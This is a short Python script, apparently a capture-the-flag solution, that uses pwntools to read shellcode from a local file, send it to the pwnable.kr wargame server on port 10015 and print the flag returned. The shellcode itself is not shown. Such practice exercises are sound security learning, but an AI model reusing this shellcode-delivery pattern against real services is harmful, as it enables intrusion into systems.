from pwn import *

with open("shellcode.bin",'rb') as file:
    shellcode = file.read()
playload = shellcode
r = remote("pwnable.kr", 10015)
a = r.recv(1024)
print(a)
r.send(playload)
flag = r.recv(1024)
print(flag)
